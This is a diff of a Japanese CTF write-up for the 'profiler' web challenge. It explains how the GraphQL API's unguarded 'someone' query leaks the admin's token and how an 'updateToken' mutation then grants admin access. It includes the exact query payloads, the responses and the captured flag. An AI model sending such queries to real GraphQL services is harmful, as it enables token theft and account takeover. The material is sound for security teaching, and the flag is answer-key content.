@@ -1,6 +1,8 @@
 # profiler
+
 301 pt (59 Solves)
-```
+
+```txt
 Let's edit your profile with profiler!
 
 Hint: You don't need to deobfuscate *.js
@@ -9,16 +11,18 @@ Notice: Server is periodically initialized
 ```
 
 ## 概要
+
 `Register`と`Login`画面。  
+
 - Register  
-`Registered successfully. Your token is [token]. Don't lose it! `と表示される。  
+`Registered successfully. Your token is [token]. Don't lose it!`と表示される。  
 - Login  
   プロフィール画面に遷移。`Update`と`Get FLAG`と`Logout`がある。  
-    - Update  
+  - Update  
     プロフィール文を更新する。`token`が必要
-    - Get FLAG  
+  - Get FLAG  
     `Sorry, your token is not administrator's one. This page is only for administrator(uid: admin).`と表示される。
-    - Logout  
+  - Logout  
     そのまま。ログアウトされる
 
 tokenが違うらしい。
@@ -31,7 +35,7 @@ cookieを見てみると`eyJ1aWQiOiJ5MGQzbiJ9.Xss_Lw.IlBxusBEtcQMdmOTy6eRjHtcjy4
 
 burpで通信を見てみるとGraphqlでいろいろしてる。Graphql playgroundでみてみる。
 
-```
+```txt
 querys{
     me
     someone
@@ -46,13 +50,13 @@ mutations{
 といったかんじ。普通に使ってたら`me`,`flag`,`updateProfile`だけつかわれてる。
 通信を書き換えてよしなにしていく。
 
-```
+```txt
 {"query":"{someone(uid:\"admin\"){uid,name,profile,token}}"}
 ```
 
 POSTで上のqueryを送信するとadminの情報が返ってくる。
 
-```
+```txt
 {
   "data": {
     "someone": {
@@ -67,7 +71,7 @@ POSTで上のqueryを送信するとadminの情報が返ってくる。
 
 返ってきたtokenを使って`updateToken`を送信。
 
-```
+```txt
 {"query":"mutation{updateToken(token:\"[token]\")}"}
 ```
 
@@ -75,6 +79,6 @@ POSTで上のqueryを送信するとadminの情報が返ってくる。
 
 `Get FLAG`を開くとFlag。
 
-```
+```txt
 ctf4b{plz_d0_n07_4cc3p7_1n7r05p3c710n_qu3ry}
 ```
